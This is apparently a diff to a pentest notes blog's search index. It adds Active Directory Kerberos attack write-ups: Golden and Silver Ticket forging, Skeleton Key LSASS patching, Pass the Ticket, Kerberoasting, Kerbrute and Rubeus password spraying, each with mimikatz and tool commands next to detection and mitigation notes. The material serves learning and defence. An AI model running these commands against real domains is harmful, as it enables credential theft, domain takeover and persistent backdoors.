@@ -911,8 +911,8 @@ window.store = {
     "https:\/\/kdbed.github.io\/posts\/golden_ticket\/": {
         
         "title": "Golden Ticket",
-        "tags": [],
-        "content": "", 
+        "tags": ["activeDirectory","kerberos",],
+        "content": "Golden Ticket A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) created using the KRBTGT account’s NTLM hash. Once created, it can be used to impersonate any user in the domain, including domain admins, and grants unlimited access to services in the domain.\nOverview Forged TGT signed with the KRBTGT hash Bypasses domain authentication controls Can impersonate any user in the domain Prerequisites SYSTEM or Domain Admin privileges on a domain-joined machine Access to the NTLM hash of the KRBTGT account Knowledge of: Domain SID Domain name (Optional) actual usernames Key Concepts KRBTGT account: Used by KDC to sign/encrypt TGTs SID: Used to tie forged ticket to domain TGT: Ticket Granting Ticket (used to request service tickets) Mimikatz Commands Dump KRBTGT Hash mimikatz # privilege::debug mimikatz # lsadump::lsa /inject /name:krbtgt Look for: Hash NTLM: a2c0b1f65a098dc5b3e3479e9d88cb5e\nGet Domain SID whoami /user Use everything before the last `-` as the domain SID: S-1-5-21-1234567890-2345678901-345678901\nCreate and Inject Golden Ticket mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-2345678901-3456789012 /krbtgt:a2c0b1f65a098dc5b3e3479e9d88cb5e /id:500 /groups:512,513,518,519 /ptt Explanation:\n`/user`: Target username (can be fake) `/domain`: Target domain `/sid`: Domain SID `/krbtgt`: Hash from lsadump `/id=500`: RID of user (500 = built-in Administrator) `/groups`: Common group SIDs: 512 – Domain Admins 513 – Domain Users 518 – Schema Admins 519 – Enterprise Admins `/ptt`: Pass-the-ticket (inject directly into memory) Validate Ticket whoami whoami /groups klist Impact TGTs can be valid for years (custom expiration) Allows full domain persistence and stealthy lateral movement Tickets are trusted by all Kerberos-enabled services Detection Look for TGTs without preceding AS-REQ (Event ID 4768 missing) Unusual ticket lifetimes (e.g. 10-year validity) Logins from accounts that don’t exist Event ID 4769 anomalies Mitigation Reset KRBTGT password twice Rotate domain admin credentials regularly Monitor use of high-privilege accounts Implement tiered access (admin tiers) Use Protected Users group and managed service accounts References https://adsecurity.org/?p=1515 https://www.harmj0y.net/blog/redteaming/kerberos-attacks-part-1/ https://learn.microsoft.com/en-us/windows-server/security/kerberos/golden-ticket ", 
         "url": "https:\/\/kdbed.github.io\/posts\/golden_ticket\/"
     },
     
@@ -1221,8 +1221,8 @@ window.store = {
     "https:\/\/kdbed.github.io\/posts\/kerberoasting\/": {
         
         "title": "Kerberoasting",
-        "tags": [],
-        "content": "*\n", 
+        "tags": ["activeDirectory","kerberos",],
+        "content": "Kerberoasting Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.\nRubeus 1 Rubeus.exe kerberoast Then crack the hashes with hashcat\n1 hashcat -m 13100 -a 0 hash.txt Pass.txt Impacket 1 sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.239.179 -request ", 
         "url": "https:\/\/kdbed.github.io\/posts\/kerberoasting\/"
     },
     
@@ -1242,7 +1242,7 @@ window.store = {
         
         "title": "Kerberos",
         "tags": [],
-        "content": "", 
+        "content": "Kerberos Protocol Kerberos Authentication Attacking Kerberos Overview The main ticket you will receive is a ticket-granting ticket (TGT). These can come in various forms, such as a .kirbi for Rubeus and .ccache for Impacket. A ticket is typically base64 encoded and can be used for multiple attacks.\nThe ticket-granting ticket is only used to get service tickets from the KDC. When requesting a TGT from the KDC, the user will authenticate with their credentials to the KDC and request a ticket. The server will validate the credentials, create a TGT and encrypt it using the krbtgt key. The encrypted TGT and a session key will be sent to the user.\nWhen the user needs to request a service ticket, they will send the TGT and the session key to the KDC, along with the service principal name (SPN) of the service they wish to access. The KDC will validate the TGT and session key. If they are correct, the KDC will grant the user a service ticket, which can be used to authenticate to the corresponding service.\nEnumeration and Attacks Kerbrute Enumeration - No domain access required Rubeus - Harvesting and Brute-forcing tickets Pass the Ticket (PtT) Attack - Access as a user to the domain required Kerberoasting - Access as any user required AS-REP Roasting - Access as any user required Golden Ticket - Full domain compromise (domain admin) required Silver Ticket - Service hash required Skeleton Key - Full domain compromise (domain admin) required\n", 
         "url": "https:\/\/kdbed.github.io\/posts\/kerberos\/"
     },
     
@@ -1252,7 +1252,7 @@ window.store = {
         
         "title": "Kerberos Authentication",
         "tags": [],
-        "content": "*\n", 
+        "content": "Kerberos Authentication Kerberos is the default authentication service for Windows domains. It\u0026rsquo;s intended to be more secure than NTLM, using third party ticket authorization and stronger encryption. Kerberos still has a handful of underlying vulnerabilities that can be used in a penetration test.\nTerms Ticket Granting Ticket (TGT) - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain. Key Distribution Center (KDC) - The Key Distribution Center is a service for issuing TGTs and service tickets; consists of the Authentication Service and the Ticket Granting Service. Authentication Service (AS) - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets. Ticket Granting Service (TGS) - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain. Service Principal Name (SPN) - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set. KDC Long Term Secret Key (KDC LT Key) - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC. Client Long Term Secret Key (Client LT Key) - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key. Service Long Term Secret Key (Service LT Key) - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC. Session Key - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket. Privilege Attribute Certificate (PAC) - The PAC holds all of the user\u0026rsquo;s relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user. Flow AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).\nAS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.\nTGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.\nTGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.\nAP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.\nAP-REP - 6.) The service grants access\n", 
         "url": "https:\/\/kdbed.github.io\/posts\/kerberos_authentication\/"
     },
     
@@ -1261,8 +1261,8 @@ window.store = {
     "https:\/\/kdbed.github.io\/posts\/kerbrute_enumeration\/": {
         
         "title": "Kerbrute",
-        "tags": ["passwordAttack","AD","pentest",],
-        "content": "Kerbrute based on obtaining a TGT. For example, using kinit on a Linux system, we can obtain and cache a Kerberos TGT. We\u0026rsquo;ll need to provide a username and password to do this. If the credentials are valid, we\u0026rsquo;ll obtain a TGT. The advantage of this technique is that it only uses two UDP frames to determine whether the password is valid, as it sends only an AS-REQ and examines the response. 1 .\\kerbrute_windows_amd64.exe passwordspray -d domain.com .\\usernames.txt \u0026#34;Password123!\u0026#34; ", 
+        "tags": ["kerberos","passwordAttack","AD","pentest",],
+        "content": "Kerbrute Kerbrute is a popular enumeration tool used to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication. based on obtaining a TGT. For example, using kinit on a Linux system, we can obtain and cache a Kerberos TGT. We\u0026rsquo;ll need to provide a username and password to do this. If the credentials are valid, we\u0026rsquo;ll obtain a TGT. The advantage of this technique is that it only uses two UDP frames to determine whether the password is valid, as it sends only an AS-REQ and examines the response. By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. Kerberos Pre-Authentication Behavior Kerberos authentication starts with an AS-REQ (Authentication Service Request) sent to the Key Distribution Center (KDC), which is typically the domain controller.\nWhen a valid username is submitted:\nThe KDC responds with an error indicating that pre-authentication is required (error code: KRB5KDC_ERR_PREAUTH_REQUIRED / 0x19).\nWhen an invalid username is submitted:\nThe KDC responds with an error indicating that the principal (user) is unknown (error code: KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN / 0x6).\nTool ropnop/kerbrute User Enumeration 1 ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt 1 .\\kerbrute_windows_amd64.exe passwordspray -d domain.com .\\usernames.txt \u0026#34;Password123!\u0026#34; ", 
         "url": "https:\/\/kdbed.github.io\/posts\/kerbrute_enumeration\/"
     },
     
@@ -1661,8 +1661,8 @@ window.store = {
     "https:\/\/kdbed.github.io\/posts\/pass_the_ticket_ptt_attack\/": {
         
         "title": "Pass the Ticket (PtT) Attack",
-        "tags": [],
-        "content": "Pass the Ticket ", 
+        "tags": ["activeDirectory","kerberos",],
+        "content": "Pass the Ticket Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a .kirbi ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin\u0026rsquo;s ticket and then impersonate that ticket using mimikatz PTT attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.\nMimikatz mimikatz.exe privilege::debug sekurlsa::tickets /export kerberos:ptt [0;131415]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi Mitigation Don\u0026rsquo;t let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.\n", 
         "url": "https:\/\/kdbed.github.io\/posts\/pass_the_ticket_ptt_attack\/"
     },
     
@@ -1784,16 +1784,6 @@ window.store = {
         "tags": ["windowsExploitation","activeDirectory","pentest",],
         "content": "SentinelOne\nADSecurity\nMITRE\n", 
         "url": "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_sid_history_injection\/"
-    },
-    
-    
-    
-    "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_skeleton_key\/": {
-        
-        "title": "Pentest - Active Directory - Skeleton Key",
-        "tags": ["activeDirectory","windowsExploitation","pentest",],
-        "content": "hacktricks\nnetwrix\n", 
-        "url": "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_skeleton_key\/"
     },
     
     
@@ -2578,6 +2568,16 @@ window.store = {
     
     
     
+    "https:\/\/kdbed.github.io\/posts\/rubeus\/": {
+        
+        "title": "Rubeus",
+        "tags": ["pentest","activeDirectory","kerberos",],
+        "content": "Rubeus Harvesting and Brute-forcing tickets Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.\nGhostPack\nHarvest TGTs every 30 seconds: Rubeus.exe harvest /interval:30 Password spray against found users and provide a .kirbi TGT for that user: Rubeus.exe brute /password:Password1 /noticket ", 
+        "url": "https:\/\/kdbed.github.io\/posts\/rubeus\/"
+    },
+    
+    
+    
     "https:\/\/kdbed.github.io\/tags\/rust\/": {
         
         "title": "Rust",
@@ -2721,9 +2721,19 @@ window.store = {
     "https:\/\/kdbed.github.io\/posts\/silver_ticket\/": {
         
         "title": "Silver Ticket",
-        "tags": [],
-        "content": "", 
+        "tags": ["kerberos","activeDirectory",],
+        "content": "Silver Ticket A Silver Ticket is a forged Kerberos Service Ticket (TGS) that allows access to a specific service without contacting a Domain Controller. It is created using the NTLM hash of the target service account, often a computer account (e.g., `HOST/`, `HTTP/`).\nOverview Forged TGS for a specific service Does not require communication with a Domain Controller Uses the service account\u0026rsquo;s NTLM hash, not KRBTGT Lower privilege, more stealthy than a Golden Ticket Prerequisites SYSTEM or Administrator access on a domain-joined machine Knowledge of: NTLM hash of the target service account (e.g., machine account or managed service account) SPN (Service Principal Name) Domain name \u0026amp; FQDN Domain SID Key Concepts Service Ticket (TGS): Used to authenticate to a service (e.g., CIFS, MSSQL, HTTP) SPN: Tied to the service account; uniquely identifies the Kerberos service Computer account NTLM hash = used to sign TGS for that host Bypasses the KDC entirely; invisible to the Domain Controller Mimikatz Commands Get NTLM Hash of the Service Account Typically done via secretsdump.py, DCSync, or LSASS dump.\nFrom Mimikatz (on DC or machine with SYSTEM access):\nmimikatz # privilege::debug mimikatz # lsadump::lsa /inject /name:TARGETHOST$ Look for: NTLM: 92f8c3cbd7e9fc367ea85e3e05b47b0f\nCreate and Inject Silver Ticket mimikatz # kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-1234567890-2345678901-3456789012 /target:targethost.corp.local /service:cifs /rc4:92f8c3cbd7e9fc367ea85e3e05b47b0f /ptt /id:500 Explanation:\n`/user`: User to impersonate (e.g. administrator) `/domain`: Target domain `/sid`: Domain SID `/target`: FQDN of the service host (e.g. `host.corp.local`) `/service`: SPN prefix (e.g. `cifs`, `http`, `mssqlsvc`) `/rc4`: NTLM hash of service account `/id`: RID of impersonated user `/ptt`: Injects ticket into memory Validate Access Example:\ndir \\\\targethost\\c$ klist whoami You should now have access to the service (e.g. `\\\\host\\c$`).\nCommon Target SPNs `CIFS/host.domain` – file shares `HTTP/host.domain` – web apps, SharePoint `MSSQLSvc/host.domain:1433` – SQL Server `WSMAN/host.domain` – WinRM Impact Access to specific services as a forged user No logs on Domain Controller (KDC not involved) Great for lateral movement or persistence Useful when Golden Ticket is too noisy Detection Service tickets without corresponding TGT issuance Unusual user/service pairings Tickets from nonexistent users `Event ID 4624` logons to services with no matching `4768/4769` events Mitigation Use AES-only authentication (silver ticket needs RC4) Rotate service account passwords regularly Restrict and monitor service account privileges Deploy Defender for Identity / endpoint telemetry References https://adsecurity.org/?p=2011 https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview https://www.harmj0y.net/blog/redteaming/kerberos-attacks-part-2/ ", 
         "url": "https:\/\/kdbed.github.io\/posts\/silver_ticket\/"
+    },
+    
+    
+    
+    "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_skeleton_key\/": {
+        
+        "title": "Skeleton Key",
+        "tags": ["kerberos","activeDirectory","windowsExploitation","pentest",],
+        "content": "Skeleton Key A Skeleton Key is a stealthy backdoor attack where Mimikatz injects a patch into LSASS memory on a Domain Controller. This allows an attacker to authenticate as any domain user using a master password, in addition to their real credentials.\nOverview Injects code into `lsass.exe` on a Domain Controller Leaves legitimate logins untouched Adds a universal password valid for all domain accounts Memory-resident: disappears on reboot Prerequisites SYSTEM-level access on a Domain Controller Ability to execute code and patch LSASS memory Mimikatz or similar tool Key Concepts LSASS: Local Security Authority Subsystem Service; handles authentication Patch: Modifies Kerberos/NTLM authentication providers in memory Backdoor password: An additional universal password accepted for all users Mimikatz Commands Load Skeleton Key Patch mimikatz # privilege::debug mimikatz # misc::skeleton Default password: mimikatz\nOnce injected, any domain user can authenticate with either:\nTheir real password The skeleton key password: `mimikatz` Test Authentication From any domain-joined machine:\nrunas /user:corp.local\\jdoe cmd # Enter password: mimikatz A shell should open, authenticating as `jdoe`.\nLimitations Only works with NTLM and Kerberos TGTs issued by the patched DC Only works while the DC is running (cleared on reboot) Does not persist unless reloaded or installed via persistent malware Impact Full domain compromise Extremely stealthy – no password changes, no account creation Invisible to domain logs unless memory or behavior is being monitored Detection Monitor LSASS for code injection or unsigned module loads Behavioral indicators: Unusual NTLM/Kerberos logons without known credentials Multiple users authenticating with the same password Defender for Identity, EDRs like CrowdStrike, Sysmon for `lsass.exe` memory anomalies Mitigation Reboot the DC (clears the patch) Use Protected Process Light (PPL) for LSASS (Windows Defender Credential Guard) Monitor with EDR Block admin rights to DCs and restrict RDP access Isolate and rebuild compromised DCs References https://adsecurity.org/?p=1277 https://blog.cylance.com/skeleton-key-malware-authenticating-any-user-with-a-password-of-your-choice https://github.com/gentilkiwi/mimikatz/wiki/module-~-misc hacktricks\nnetwrix\n", 
+        "url": "https:\/\/kdbed.github.io\/posts\/pentest_active_directory_skeleton_key\/"
     },
     
     
